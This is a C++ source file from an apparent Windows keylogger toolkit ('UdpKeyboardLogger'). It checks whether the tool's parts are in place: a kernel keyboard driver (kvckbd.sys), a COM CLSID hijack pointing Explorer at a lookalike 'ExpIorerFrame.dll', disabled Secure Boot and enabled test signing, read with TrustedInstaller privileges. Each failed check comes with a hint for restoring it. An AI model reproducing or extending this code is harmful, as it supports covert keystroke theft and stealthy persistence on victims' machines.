#include "SystemStatus.h"
#include "UdpServiceManager.h"
#include "TrustedInstallerExecutor.h"
#include "DriverInstaller.h"
#include "DebugConfig.h"
#include <Windows.h>
#include <iostream>

std::wstring SystemStatus::GetCheckmark(bool status) {
    return status ? L"[+]" : L"[-]";
}

std::vector<ComponentStatus> SystemStatus::CheckAllComponents() {
    std::vector<ComponentStatus> components;
    
	// Check Secure Boot
	ComponentStatus secureboot;
	secureboot.name = L"Secure Boot";
	secureboot.status = !CheckSecureBoot();  // FALSE if enabled (blocks)
	secureboot.details = CheckSecureBoot() ? L"ENABLED (blocks driver)" : L"DISABLED (allows driver)";
	secureboot.fixHint = CheckSecureBoot() ? L"Disable Secure Boot in UEFI/BIOS" : L"";
	components.push_back(secureboot);
	
    // Check Windows Service
    ComponentStatus service;
    service.name = L"Windows Service";
    service.status = UdpServiceManager::IsServiceRunning();  // This should work now
    service.details = service.status ? L"RUNNING (UdpKeyboardLogger)" : L"STOPPED (UdpKeyboardLogger)";
    service.fixHint = service.status ? L"" : L"Run 'UdpLogger service start'";
    components.push_back(service);
    
    // Check Kernel Driver
    ComponentStatus driver;
    driver.name = L"Kernel Driver";
    driver.status = CheckDriverStatus();
    driver.details = driver.status ? L"LOADED (kvckbd.sys)" : L"STOPPED (kvckbd.sys)";
    driver.fixHint = driver.status ? L"" : L"Requires reboot or run 'UdpLogger driver start'";
    components.push_back(driver);
    
    // Check CLSID Hijack
    ComponentStatus clsid;
    clsid.name = L"CLSID Hijack";
    clsid.status = CheckCLSIDHijack();
    clsid.details = clsid.status ? L"ACTIVE (ExplorerFrame.dll -> ExpIorerFrame.dll)" : L"INACTIVE";
    clsid.fixHint = clsid.status ? L"" : L"Run 'UdpLogger install' to repair";
    components.push_back(clsid);
    
    // Check Test Signing
    ComponentStatus testsigning;
    testsigning.name = L"Test Signing";
    testsigning.status = CheckTestSigning();
    testsigning.details = testsigning.status ? L"ENABLED (BCD)" : L"DISABLED (BCD)";
    testsigning.fixHint = testsigning.status ? L"" : L"Run 'UdpLogger install' and reboot";
    components.push_back(testsigning);
    
    // Check Files
    ComponentStatus files;
    files.name = L"Files";
    files.status = CheckDriverFiles();
    files.details = files.status ? L"All components present" : L"Missing driver files";
    files.fixHint = files.status ? L"" : L"Run 'UdpLogger install' to restore files";
    components.push_back(files);
    
    return components;
}

bool SystemStatus::CheckSecureBoot() {
    // Check SecureBoot via the registry
    HKEY hKey;
    DWORD secureBootEnabled = 0;
    DWORD dataSize = sizeof(DWORD);
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
                     L"SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        RegQueryValueExW(hKey, L"UEFISecureBootEnabled", nullptr, nullptr, 
                        (LPBYTE)&secureBootEnabled, &dataSize);
        RegCloseKey(hKey);
    }
    
    return secureBootEnabled == 1;
}

bool SystemStatus::CheckDriverStatus() {
    // Use the new method from UdpServiceManager
    return UdpServiceManager::IsDriverServiceRunning();
}

bool SystemStatus::CheckCLSIDHijack() {
    TrustedInstallerExecutor tiExecutor;
    std::wstring currentValue;
    
    bool success = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",
        currentValue
    );
    
    return success && currentValue.find(L"ExpIorerFrame.dll") != std::wstring::npos;
}

bool SystemStatus::CheckTestSigning() {
    TrustedInstallerExecutor tiExecutor;
    std::wstring bootGuid;
    
    // Read current boot entry GUID
    bool readSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\23000003",
        L"Element",
        bootGuid
    );
    
    if (!readSuccess || bootGuid.empty()) {
        return false;
    }
    
    // Check if test signing element exists and is enabled
    std::wstring testSigningPath = L"BCD00000000\\Objects\\" + bootGuid + L"\\Elements\\16000049";
    std::vector<BYTE> elementData;
    
    bool testSigningExists = tiExecutor.ReadRegistryBinaryAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        testSigningPath,
        L"Element",
        elementData
    );
    
    return testSigningExists && !elementData.empty() && elementData[0] == 0x01;
}

bool SystemStatus::CheckDriverFiles() {
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring dllPath = std::wstring(systemDir) + L"\\ExpIorerFrame.dll";
    std::wstring driverStorePath = DriverInstaller::GetDriverStorePath();
    std::wstring sysPath = driverStorePath + L"\\kvckbd.sys";
    
    DWORD dllAttrs = GetFileAttributesW(dllPath.c_str());
    DWORD sysAttrs = GetFileAttributesW(sysPath.c_str());
    
    return (dllAttrs != INVALID_FILE_ATTRIBUTES) && 
           (sysAttrs != INVALID_FILE_ATTRIBUTES);
}